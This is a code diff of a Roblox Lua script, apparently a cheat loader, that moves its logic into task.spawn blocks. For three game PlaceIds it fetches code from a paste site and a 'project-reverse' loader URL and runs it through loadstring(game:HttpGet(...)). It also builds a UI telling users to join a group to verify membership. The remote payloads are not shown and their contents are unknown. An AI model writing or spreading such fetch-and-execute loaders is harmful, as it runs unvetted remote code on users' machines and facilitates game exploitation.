@@ -1,13 +1,14 @@
-local placeId = game.PlaceId
-
-if placeId == 920587237 then
-    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/QVp8mPtGuS/0", true))()
-elseif placeId == 142823291 then
-    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/QVp8mPtGuS/0", true))()
-elseif placeId == 97598239454123 then
-    loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImNiYjE2Yjk5LTQ4MTQtNDZjOS05ZThmLWJlOWYwYjFjZTMzMSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJnYWcyX21haW5fdmlzdWFsIn19"))()
-end
-
+task.spawn(function ()
+	local placeId = game.PlaceId
+		if placeId == 920587237 then
+		loadstring(game:HttpGet("https://cdn.sourceb.in/bins/QVp8mPtGuS/0", true))()
+	elseif placeId == 142823291 then
+		loadstring(game:HttpGet("https://cdn.sourceb.in/bins/QVp8mPtGuS/0", true))()
+	elseif placeId == 97598239454123 then
+		loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImNiYjE2Yjk5LTQ4MTQtNDZjOS05ZThmLWJlOWYwYjFjZTMzMSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJnYWcyX21haW5fdmlzdWFsIn19"))()
+	end
+end)
+task.spawn(function ()
 local Fluent
 local success, err = pcall(function()
     Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
@@ -78,5 +79,5 @@ Tabs.Instructions:AddParagraph({
     Title = "3. Final Step",
     Content = "Join the group to verify membership"
 })
-
+end)
 if true then return end
